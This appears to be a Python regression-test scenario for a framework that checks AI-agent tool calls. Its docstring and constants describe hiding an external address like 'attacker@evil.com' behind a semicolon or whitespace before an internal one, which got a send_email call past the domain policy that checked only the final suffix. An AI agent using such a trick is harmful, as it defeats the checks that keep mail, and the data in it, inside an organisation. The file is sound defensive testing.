"""Regression attack: hide an external recipient with ``;``/whitespace.

The first recipient-list patch only rejected comma-separated address
fields.  Common mail clients and APIs also accept semicolons (and, in
some contexts, whitespace/newline-separated recipient strings).  Before
round-2 fixes, a value such as::

    "attacker@evil.com; friend@company.com"

passed both the Z3 precondition and the runtime automaton because the
model looked only at the final ``@company.com`` suffix.  This workflow is
otherwise harmless (no tainted body) so it isolates the domain-policy
bypass from the subject-taint fix.
"""

from __future__ import annotations

from guardians import Workflow, WorkflowStep, ToolCallNode

from .common import Scenario


EXTERNAL_RECIPIENT = "attacker@evil.com"
INTERNAL_COVER_RECIPIENT = "friend@company.com"
SEMICOLON_RECIPIENT_LIST = f"{EXTERNAL_RECIPIENT}; {INTERNAL_COVER_RECIPIENT}"
WHITESPACE_RECIPIENT_LIST = f"{EXTERNAL_RECIPIENT} {INTERNAL_COVER_RECIPIENT}"


def build_workflow(to: str = SEMICOLON_RECIPIENT_LIST) -> Workflow:
    """Workflow that should be rejected by the domain policy."""
    return Workflow(
        goal="Send a harmless message to an external recipient hidden in a list",
        steps=[
            WorkflowStep(
                label="Send to external plus internal cover recipient",
                tool_call=ToolCallNode(
                    tool_name="send_email",
                    arguments={
                        "to": to,
                        "subject": "Domain-policy regression probe",
                        "body": "No tainted content; this isolates recipient parsing.",
                    },
                ),
            ),
        ],
    )


def build(scenario: Scenario) -> Workflow:
    """Return the semicolon-recipient regression workflow."""
    del scenario
    return build_workflow()
